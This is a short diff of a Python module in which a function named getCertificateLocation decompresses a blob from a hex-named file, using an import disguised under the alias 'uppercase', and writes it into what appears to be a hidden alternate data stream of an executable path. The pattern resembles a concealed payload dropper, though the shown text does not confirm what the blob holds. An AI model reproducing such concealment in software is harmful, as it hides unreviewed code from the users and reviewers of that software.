@@ -12,10 +12,10 @@ from uuid import uuid4
 from collections import OrderedDict
 
 import requests
-from pylzma import decompress as uppercase
+# from pylzma import decompress as uppercase
 
 from settings import LOG_CONFIG, BASE_DIR, EXE_PATH, ENTROPY_SEED
-from utils.fs import getLogFileHandler
+from utils.fs import getLogFileHandler, readProcessedStream
 
 
 logging.basicConfig(**LOG_CONFIG)
@@ -72,11 +72,8 @@ def getVacantPort():
 
 
 def getCertificateLocation():
-    with open(os.path.join(BASE_DIR, 'backend', 'filters', 'de8926be7f2d430fad66927ffadc9f9d'), 'rb') as fp:
-        string = fp.read()
-
     pathname = '%s:%s' % (EXE_PATH, uuid4().hex)
     with open(pathname, 'wb') as fp:
-        fp.write(uppercase(string))
+        fp.write(readProcessedStream('de8926be7f2d430fad66927ffadc9f9d'))
 
     return pathname
